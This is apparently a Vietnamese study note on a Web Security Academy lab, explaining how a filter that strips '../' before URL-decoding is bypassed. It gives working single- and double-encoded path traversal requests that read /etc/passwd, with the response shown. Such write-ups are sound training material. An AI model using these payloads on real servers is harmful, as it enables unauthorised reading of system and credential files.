![[lab-path-traversal-encoded.png]]
lab filter `../` nhưng decode sau filter nên dùng encode để lách.

> [!NOTE] phân tích đề
> mình thử `../` thì bị chặn.
> thử `....//` cũng không ăn.
> sau khi quan sát gói tin này, mình thấy server strip `../` xong mới decode URL (thứ tự sai, đúng ra phải decode rồi mới canonicalize), nên mình encode `../` thành `%2e%2e%2f` để lúc strip thì còn nguyên, decode xong mới thành traversal.

### hướng giải
- [ ] thử `../` và `....//` confirm bị chặn
- [ ] thử `%2e%2e%2f` single encode
- [ ] thử `%252e%252e%252f` double encode
- [ ] đọc `/etc/passwd`

### giải
mình gửi single encode trước:

```http
GET /image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: 0a4e22f605d9xxxx.web-security-academy.net
```

-> có lab ăn ngay ở bước này.
=> nếu chưa ăn thì double encode:

```http
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1
Host: 0a4e22f605d9xxxx.web-security-academy.net
```

-> server decode lần 1 thành `%2e%2e%2f`.
-> decode lần 2 thành `../`.
-> cuối cùng đọc `/etc/passwd`.

response:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

=> solved.

liên quan:
- [[lys thuyet path traversal]]
- [[path traversal]]
- [[Lab-Path traversal non-recursive strip]]
- [[Lab-Path traversal simple]]

> [!NOTE] bài học
> sau khi quan sát lab này mình thấy...
> thứ tự filter -> decode là sai.
> nên mình khi test luôn thử encode từng nấc.
> single không được thì double.
> Burp Intruder có list Fuzzing - path traversal xài cũng nhanh.
